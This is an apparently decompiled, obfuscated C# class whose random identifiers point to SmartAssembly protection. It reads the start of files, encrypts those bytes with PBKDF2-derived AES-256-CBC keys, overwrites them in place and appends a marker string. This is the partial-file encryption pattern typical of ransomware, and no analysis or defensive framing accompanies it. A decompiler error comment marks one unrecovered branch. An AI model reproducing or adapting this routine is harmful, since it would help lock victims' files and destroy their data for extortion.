using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace coxZRmDhvSAWo;

public static class c000018
{
	[NonSerialized]
	internal static GetString f000053;

	public static byte[] SvtZMRYDytMixf(byte[] p0, byte[] p1, byte[] p2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = XEFUMsPltov(p1, p2);
		p1 = null;
		GC.Collect();
		using (Aes aes = new AesManaged())
		{
			aes.KeySize = 256;
			aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
			aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
			aes.Padding = PaddingMode.None;
			aes.Mode = CipherMode.CBC;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(p0, 0, p0.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			rfc2898DeriveBytes.Dispose();
		}
		return result;
	}

	public static Rfc2898DeriveBytes XEFUMsPltov(byte[] p0, byte[] p1)
	{
		return new Rfc2898DeriveBytes(p0, p1, 52768);
	}

	public static byte[] KQanXSigbuDh(string p0, int p1)
	{
		byte[] array = new byte[p1];
		try
		{
			if (GhAMvbuoccW.QtTrkEhpkGUJgMO == "YES")
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(p0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, p1);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(p0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, p1);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (GhAMvbuoccW.CCDyMIHlAe)
			{
				try
				{
					File.AppendAllText(GhAMvbuoccW.f000025, "File: " + p0 + " - Error while reading from file: " + ex.Message + "\r\n");
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream = new FileStream(p0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, p1);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
	}

	public static bool EHTmbBVFpgxa(string p0, byte[] p1, byte[] p2 = null)
	{
		try
		{
			byte[] array = null;
			if (GhAMvbuoccW.QtTrkEhpkGUJgMO == "YES")
			{
				array = (GhAMvbuoccW.PAOJgADrbjEa ? Encoding.ASCII.GetBytes(GhAMvbuoccW.m000003(GhAMvbuoccW.nmjDhIwEGnMOrO) + "+" + Convert.ToString(GhAMvbuoccW.f000010) + "+") : Encoding.ASCII.GetBytes(GhAMvbuoccW.m000003(GhAMvbuoccW.nmjDhIwEGnMOrO) + "-" + Convert.ToString(GhAMvbuoccW.f000010) + "-"));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(p0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(p1, 0, p1.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(p0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!GhAMvbuoccW.PAOJgADrbjEa)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(p2, 0, p2.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (GhAMvbuoccW.PAOJgADrbjEa ? Encoding.ASCII.GetBytes(GhAMvbuoccW.m000003(GhAMvbuoccW.nmjDhIwEGnMOrO) + "+" + Convert.ToString(GhAMvbuoccW.f000010) + "+") : Encoding.ASCII.GetBytes(GhAMvbuoccW.m000003(GhAMvbuoccW.nmjDhIwEGnMOrO) + "-" + Convert.ToString(GhAMvbuoccW.f000010) + "-"));
				FileStream fileStream2 = new FileStream(p0, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(p1, 0, p1.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream = new FileStream(p0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!GhAMvbuoccW.PAOJgADrbjEa)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(p2, 0, p2.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			GhAMvbuoccW.f00002b++;
		}
		catch (Exception ex)
		{
			if (!GhAMvbuoccW.CCDyMIHlAe)
			{
				/*Error: Could not find block for branch target IL_022a*/;
			}
			try
			{
				File.AppendAllText(GhAMvbuoccW.f000025, "File: " + p0 + " - Error while partial writing to file: " + ex.Message + "\r\n");
			}
			catch (Exception)
			{
			}
			try
			{
				byte[] array = null;
				array = (GhAMvbuoccW.PAOJgADrbjEa ? Encoding.ASCII.GetBytes(GhAMvbuoccW.m000003(GhAMvbuoccW.nmjDhIwEGnMOrO) + "+" + Convert.ToString(GhAMvbuoccW.f000010) + "+") : Encoding.ASCII.GetBytes(GhAMvbuoccW.m000003(GhAMvbuoccW.nmjDhIwEGnMOrO) + "-" + Convert.ToString(GhAMvbuoccW.f000010) + "-"));
				FileStream fileStream2 = new FileStream(p0, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(p1, 0, p1.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using (FileStream fileStream = new FileStream(p0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!GhAMvbuoccW.PAOJgADrbjEa)
					{
						fileStream.Write(array, 0, array.Length);
					}
					else
					{
						fileStream.Write(p2, 0, p2.Length);
						fileStream.Write(array, 0, array.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static c000018()
	{
		Strings.CreateGetStringDelegate(typeof(c000018));
	}
}
